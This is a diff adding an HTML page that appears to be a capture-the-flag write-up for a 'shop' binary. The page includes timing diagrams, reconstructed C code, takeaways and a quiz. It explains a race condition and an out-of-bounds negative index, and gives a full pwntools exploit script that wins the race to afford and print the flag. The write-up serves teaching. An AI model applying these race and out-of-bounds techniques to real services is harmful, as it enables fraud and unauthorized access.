+      <!-- Thread 1 blocks: spawned at t=0 -->
+      <!-- credit +99: t=0→1ms (9px) -->
+      <rect x="94"  y="32" width="9"   height="28" fill="#4ade8a" rx="2"/>
+      <!-- usleep 50ms: t=1→51ms but we show 0→50 so width=452 total, usleep starts after credit -->
+      <rect x="103" y="32" width="434" height="28" fill="#f5a623" rx="2" opacity=".85"/>
+      <!-- clear: t=51ms+ (shown at end) -->
+      <rect x="537" y="32" width="11"  height="28" fill="#607080" rx="2"/>
+
+      <!-- Thread 2 blocks: spawned at t=~1ms (9px offset) -->
+      <!-- credit +99: t=1→2ms -->
+      <rect x="103" y="84" width="9"   height="28" fill="#4ade8a" rx="2"/>
+      <!-- usleep 50ms -->
+      <rect x="112" y="84" width="434" height="28" fill="#f5a623" rx="2" opacity=".65"/>
+      <!-- clear: slightly after T1 -->
+      <rect x="546" y="84" width="11"  height="28" fill="#607080" rx="2"/>
+
+      <!-- Thread 2 spawn marker: dashed line at x=94+9=103 -->
+      <line x1="103" y1="60" x2="103" y2="82" stroke="#5b9cf6" stroke-width="1" stroke-dasharray="3,2"/>
+      <text x="106" y="74" fill="#5b9cf6" font-size="9">spawn T2 ≈1ms</text>
+
+      <!-- Labels on bars -->
+      <text x="99"  y="50" text-anchor="middle" fill="#0a0e1a" font-size="8" font-weight="bold">+99</text>
+      <text x="310" y="50" text-anchor="middle" fill="#0a0e1a" font-size="10" font-weight="bold">usleep(50ms)  ← Thread 1 sleeping</text>
+      <text x="542" y="50" text-anchor="middle" fill="#e0e0e0" font-size="8">clr</text>
+      <text x="108" y="102" text-anchor="middle" fill="#0a0e1a" font-size="8" font-weight="bold">+99</text>
+      <text x="316" y="102" text-anchor="middle" fill="#0a0e1a" font-size="10" font-weight="bold">usleep(50ms)  ← Thread 2 sleeping</text>
+      <text x="551" y="102" text-anchor="middle" fill="#e0e0e0" font-size="8">clr</text>
+
+      <!-- Row labels -->
+      <text x="82" y="50"  text-anchor="end" fill="#5b9cf6"  font-size="11">T1</text>
+      <text x="82" y="102" text-anchor="end" fill="#4ade8a" font-size="11">T2</text>
+
+      <!-- Time axis ticks and labels -->
+      <line x1="94" y1="130" x2="546" y2="130" stroke="#1e2d47" stroke-width="1"/>
+      <line x1="94"  y1="128" x2="94"  y2="133" stroke="#607080" stroke-width="1"/>
+      <line x1="184" y1="128" x2="184" y2="133" stroke="#607080" stroke-width="1"/>
+      <line x1="274" y1="128" x2="274" y2="133" stroke="#607080" stroke-width="1"/>
+      <line x1="365" y1="128" x2="365" y2="133" stroke="#607080" stroke-width="1"/>
+      <line x1="455" y1="128" x2="455" y2="133" stroke="#607080" stroke-width="1"/>
+      <line x1="546" y1="128" x2="546" y2="133" stroke="#607080" stroke-width="1"/>
+      <text x="94"  y="143" text-anchor="middle" fill="#607080" font-size="10">0ms</text>
+      <text x="184" y="143" text-anchor="middle" fill="#607080" font-size="10">10ms</text>
+      <text x="274" y="143" text-anchor="middle" fill="#607080" font-size="10">20ms</text>
+      <text x="365" y="143" text-anchor="middle" fill="#607080" font-size="10">30ms</text>
+      <text x="455" y="143" text-anchor="middle" fill="#607080" font-size="10">40ms</text>
+      <text x="546" y="143" text-anchor="middle" fill="#607080" font-size="10">50ms</text>
+
+      <!-- Legend -->
+      <rect x="94"  y="158" width="12" height="10" fill="#4ade8a" rx="1"/>
+      <text x="110" y="167" fill="#607080" font-size="10">money += 99  (instant)</text>
+      <rect x="234" y="158" width="12" height="10" fill="#f5a623" rx="1"/>
+      <text x="250" y="167" fill="#607080" font-size="10">usleep(50ms)</text>
+      <rect x="340" y="158" width="12" height="10" fill="#607080" rx="1"/>
+      <text x="356" y="167" fill="#607080" font-size="10">bag[slot]=0  (clear)</text>
+      <rect x="94"  y="176" width="452" height="10" fill="#f06a6a" rx="1" opacity=".2"/>
+      <text x="320" y="185" text-anchor="middle" fill="#f06a6a" font-size="10">bag[0] still != 0 during entire red zone → T2 passes the check</text>
+    </svg>
+  </div>
+
+  <h3>Why naive Python breaks the race</h3>
+  <pre><span class="cm"># WRONG — recvuntil blocks until server responds, eating the 50ms window</span>
+sale(<span class="num">0</span>)   <span class="cm"># sends input, waits for full menu to print...</span>
+sale(<span class="num">0</span>)   <span class="bug"># ...by now 50ms has passed. bag[0] already cleared.</span>
+
+<span class="cm"># CORRECT — flood stdin before any recvuntil</span>
+p.recvuntil(<span class="str">b'> '</span>)   <span class="cm"># wait for first prompt only</span>
+p.sendline(<span class="str">b'3'</span>)     <span class="cm"># menu: sale</span>
+p.sendline(<span class="str">b'0'</span>)     <span class="cm"># slot 0 → thread 1 spawned</span>
+p.sendline(<span class="str">b'3'</span>)     <span class="ok"># menu: sale again  ← arrives before 50ms expire</span>
+p.sendline(<span class="str">b'0'</span>)     <span class="ok"># slot 0 → thread 2 spawned while thread 1 sleeps</span></pre>
+</div>
+
+<!-- BUG 2 -->
+<div class="section">
+  <h2>Bug #2 — Out-of-Bounds Array Index</h2>
+
+  <div class="bug-box">
+    <div class="bug-label">BUG TYPE: OOB Array Index (unchecked user-controlled index into global array)</div>
+    <p>sale() passes the user-supplied index directly to <code>bag[index]</code> with no bounds check. Since <code>bag</code> is a global array at a fixed address, a negative index reaches backwards into memory — directly to other global variables.</p>
+  </div>
+
+  <h3>Address Arithmetic</h3>
+  <pre><span class="cm">; Assembly: eax = *(0x6020c0 + index × 4)</span>
+<span class="cm">; With index = -8:</span>
+target = <span class="num">0x6020c0</span> + (-<span class="num">8</span>) × <span class="num">4</span>
+       = <span class="num">0x6020c0</span> - <span class="num">0x20</span>
+       = <span class="num">0x6020a0</span>   <span class="ok">← exactly &amp;money</span></pre>
+
+  <div class="oob-diagram">
+    <div class="oob-calc">
+      <div class="oob-box">
+        <div class="label">bag base address</div>
+        <div class="val" style="color:var(--blue)">0x6020c0</div>
+      </div>
+      <div class="oob-arrow">+ index × 4</div>
+      <div class="oob-box">
+        <div class="label">index = <span style="color:var(--red)">-8</span></div>
+        <div class="val" style="color:var(--red)">-8 × 4 = -0x20</div>
+      </div>
+    </div>
+    <div class="oob-result">→ reaches 0x6020a0 = &amp;money</div>
+  </div>
+
+  <p>With <code>index = -8</code>, the final write in <code>to_sale</code> becomes <code>money = 0</code>. This is a <strong>zero-write-anywhere primitive</strong> — not needed here, but dangerous in harder variants of this challenge pattern.</p>
+</div>
+
+<!-- RECONSTRUCTED C -->
+<div class="section">
+  <div class="section-label">04 &nbsp;/&nbsp; SOURCE</div>
+  <h2>Reconstructed C Code</h2>
+
+  <pre><span class="kw">int</span>  money   = <span class="num">100</span>;    <span class="cm">// 0x6020a0</span>
+<span class="kw">int</span>  bag[<span class="num">16</span>];          <span class="cm">// 0x6020c0  (0=empty 1=flag 2=pen 3=wish)</span>
+<span class="kw">char</span> flag_buf[<span class="num">0x30</span>];   <span class="cm">// 0x6022a0  (filled from /flag at startup)</span>
+
+<span class="kw">void</span> *<span class="fn">to_sale</span>(<span class="kw">void</span> *arg) {
+    <span class="kw">int</span> slot = (<span class="kw">int</span>)(<span class="kw">long</span>)arg;    <span class="cm">// no bounds check inherited from caller</span>
+    <span class="kw">int</span> type = bag[slot];          <span class="bug">// BUG: slot can be negative → OOB</span>
+
+    <span class="kw">if</span> (type == <span class="num">1</span>) money += <span class="num">100</span>;  <span class="cm">// flag recycle</span>
+    <span class="kw">if</span> (type == <span class="num">2</span>) money += <span class="num">99</span>;   <span class="cm">// pen recycle  ← credited NOW</span>
+
+    <span class="fn">usleep</span>(<span class="num">50000</span>);                <span class="bug">// BUG: 50ms gap — RACE WINDOW</span>
+
+    bag[slot] = <span class="num">0</span>;               <span class="bug">// BUG: only cleared 50ms later</span>
+    <span class="kw">return</span> NULL;
+}
+
+<span class="kw">void</span> <span class="fn">sale</span>(<span class="kw">void</span>) {
+    <span class="kw">int</span> slot = <span class="fn">read_int</span>();       <span class="bug">// BUG: no bounds check on slot</span>
+    <span class="kw">if</span> (bag[slot] != <span class="num">0</span>) {        <span class="bug">// slot=-8 reads &amp;money instead of bag</span>
+        pthread_t tid;
+        <span class="fn">pthread_create</span>(&amp;tid, NULL, to_sale, (<span class="kw">void</span>*)(<span class="kw">long</span>)slot);
+        <span class="bug">// NO pthread_join — main thread returns immediately!</span>
+    }
+}</pre>
+</div>
+
+<!-- EXPLOIT -->
+<div class="section">
+  <div class="section-label">05 &nbsp;/&nbsp; EXPLOIT</div>
+  <h2>Exploit Development</h2>
+
+  <h3>Step-by-step Plan</h3>
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-title">Race condition on slot 0 (pen)</div>
+        <div class="step-body">Flush two <code>sale(0)</code> calls to stdin before any <code>recvuntil</code>. Both threads spawn inside the 50ms window. <code>money: 100 + 99 + 99 = 298</code></div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-title">Buy the flag (item 1, costs 200)</div>
+        <div class="step-body">298 ≥ 200 → purchase succeeds. <code>bag[some_slot] = 1</code>. <code>money: 298 - 200 = 98</code></div>
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-title">Call look() to print the flag</div>
+        <div class="step-body"><code>look()</code> iterates all slots. Finds <code>bag[i] == 1</code> → <code>printf("[%02d]: flag -&gt; %s", i, flag_buf)</code></div>
+      </div>
+    </div>
+  </div>
+
+  <h3>Final Exploit Script</h3>
+  <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+<span class="kw">import</span> sys
+
+context.arch = <span class="str">'amd64'</span>
+context.log_level = <span class="str">'info'</span>
+
+<span class="kw">if</span> len(sys.argv) > <span class="num">1</span>:
+    host, port = sys.argv[<span class="num">1</span>].split(<span class="str">':'</span>)
+    p = <span class="fn">remote</span>(host, <span class="fn">int</span>(port), ssl=<span class="kw">True</span>, sni=host)
+<span class="kw">else</span>:
+    p = <span class="fn">process</span>(<span class="str">'./shop'</span>)
+
+<span class="kw">def</span> <span class="fn">buy</span>(item):
+    p.<span class="fn">recvuntil</span>(<span class="str">b'> '</span>)
+    p.<span class="fn">sendline</span>(<span class="str">b'2'</span>)
+    p.<span class="fn">recvuntil</span>(<span class="str">b'> '</span>)
+    p.<span class="fn">sendline</span>(<span class="fn">str</span>(item).<span class="fn">encode</span>())
+
+<span class="kw">def</span> <span class="fn">look</span>():
+    p.<span class="fn">recvuntil</span>(<span class="str">b'> '</span>)
+    p.<span class="fn">sendline</span>(<span class="str">b'1'</span>)
+
+<span class="cm"># ── Step 1: Race Condition ─────────────────────────────────────────────</span>
+<span class="cm"># Receive the first prompt, then send both sale sequences immediately.</span>
+<span class="cm"># No recvuntil between sends → both arrive within the 50ms window.</span>
+p.<span class="fn">recvuntil</span>(<span class="str">b'> '</span>)
+p.<span class="fn">sendline</span>(<span class="str">b'3'</span>)     <span class="cm"># select sale</span>
+p.<span class="fn">sendline</span>(<span class="str">b'0'</span>)     <span class="cm"># slot 0 → thread 1 spawns, money += 99</span>
+p.<span class="fn">sendline</span>(<span class="str">b'3'</span>)     <span class="ok"># select sale again — arrives before thread 1 clears bag[0]</span>
+p.<span class="fn">sendline</span>(<span class="str">b'0'</span>)     <span class="ok"># slot 0 → thread 2 spawns, money += 99</span>
+<span class="cm"># money is now 100 + 99 + 99 = 298</span>
+
+<span class="cm"># ── Step 2: Buy the flag ───────────────────────────────────────────────</span>
+<span class="fn">buy</span>(<span class="num">1</span>)               <span class="cm"># costs 200; money: 298 → 98; bag[slot] = 1</span>
+
+<span class="cm"># ── Step 3: Print the flag ─────────────────────────────────────────────</span>
+<span class="fn">look</span>()               <span class="ok"># look() sees bag[i]==1 → prints flag_buf</span>
+
+p.<span class="fn">interactive</span>()</pre>
+</div>
+
+<!-- TAKEAWAYS -->
+<div class="section">
+  <div class="section-label">06 &nbsp;/&nbsp; TAKEAWAYS</div>
+  <h2>Key Takeaways</h2>
+  <div class="takeaways">
+    <div class="takeaway">
+      <div class="t-num">01</div>
+      <div class="t-title">pthread_create without pthread_join = race candidate</div>
+      <div class="t-body">If a thread modifies shared state and the caller doesn't join, ask: is there a delay between the check and the write? That gap is your window.</div>
+    </div>
+    <div class="takeaway">
+      <div class="t-num">02</div>
+      <div class="t-title">recvuntil kills timing</div>
+      <div class="t-body">Waiting for server responses between inputs adds enough latency to close a 50ms race window. Send everything at once, collect output later.</div>
+    </div>
+    <div class="takeaway">
+      <div class="t-num">03</div>
+      <div class="t-title">OOB index ≠ buffer overflow</div>
+      <div class="t-body">An unchecked global array index lets you aim at any address with arithmetic: <code>base + index × size</code>. Negative index reaches backwards.</div>
+    </div>
+    <div class="takeaway">
+      <div class="t-num">04</div>
+      <div class="t-title">Not every PWN needs a shell</div>
+      <div class="t-body">The flag was already loaded into memory at startup. Win condition was triggering a print — no code execution required.</div>
+    </div>
+    <div class="takeaway">
+      <div class="t-num">05</div>
+      <div class="t-title">Canary + NX ≠ safe</div>
+      <div class="t-body">Both mitigations were active, yet completely irrelevant. They protect memory layout attack surfaces — not application-logic bugs.</div>
+    </div>
+  </div>
+</div>
+
+<!-- QUIZ -->
+<div class="section">
+  <div class="section-label">07 &nbsp;/&nbsp; QUIZ</div>
+  <h2>Quiz — Test Your Understanding</h2>
+
+  <div class="quiz-item">
+    <div class="quiz-q" onclick="toggle(this)">Q1 &nbsp; usleep(0xc350) — what is that in ms, and why does the exact value matter? <span class="arrow">▶</span></div>
+    <div class="quiz-a"><strong>50ms</strong> (0xc350 = 50,000 µs). The value defines the race window width. Larger = easier to win; smaller = harder. The exploit works because even a local IPC round-trip is well under 50ms when you batch all sends.</div>
+  </div>
+
+  <div class="quiz-item">
+    <div class="quiz-q" onclick="toggle(this)">Q2 &nbsp; Why does sale() have an OOB bug but buy() does not? <span class="arrow">▶</span></div>
+    <div class="quiz-a"><code>buy()</code> validates: <code>if (choice != 1 &amp;&amp; choice != 2 &amp;&amp; choice != 3) return;</code>. <code>sale()</code> reads a slot index and uses it directly in <code>bag[index]</code> with zero range validation.</div>
+  </div>
+
+  <div class="quiz-item">
+    <div class="quiz-q" onclick="toggle(this)">Q3 &nbsp; What index reaches &amp;money? Show the calculation. <span class="arrow">▶</span></div>
+    <div class="quiz-a">
+      <pre>target  = 0x6020a0
+base    = 0x6020c0
+offset  = 0x6020a0 - 0x6020c0 = -0x20 = -32 bytes
+index   = -32 / 4 = -8</pre>
+      Pass <code>index = -8</code>. After 50ms, <code>to_sale</code> writes 0 to <code>bag[-8]</code> = <code>&amp;money</code> → <code>money = 0</code>.
+    </div>
+  </div>
+
+  <div class="quiz-item">
+    <div class="quiz-q" onclick="toggle(this)">Q4 &nbsp; Why does adding recvuntil between the two sale sends break the exploit? <span class="arrow">▶</span></div>
+    <div class="quiz-a"><code>recvuntil</code> blocks Python until the full menu is printed by the server. That takes longer than 50ms. By the time the second <code>sale</code> is sent, the background thread has already executed <code>bag[0] = 0</code>, so the check fails and the sell is rejected.</div>
+  </div>
+
+  <div class="quiz-item">
+    <div class="quiz-q" onclick="toggle(this)">Q5 &nbsp; This binary has Canary and NX. Why were they both completely irrelevant? <span class="arrow">▶</span></div>
+    <div class="quiz-a">Canary detects stack buffer overflows. NX prevents shellcode execution on the stack. This exploit never overflows a buffer and never injects code — it manipulates application-level state (coin balance) via a race condition to purchase an item whose display routine prints a flag already in memory.</div>
+  </div>
+</div>
+
+</div><!-- /wrap -->
+
+<script>
+function toggle(el) {
+  el.classList.toggle('open');
+  const ans = el.nextElementSibling;
+  ans.classList.toggle('show');
+}
+</script>
+</body>
+</html>
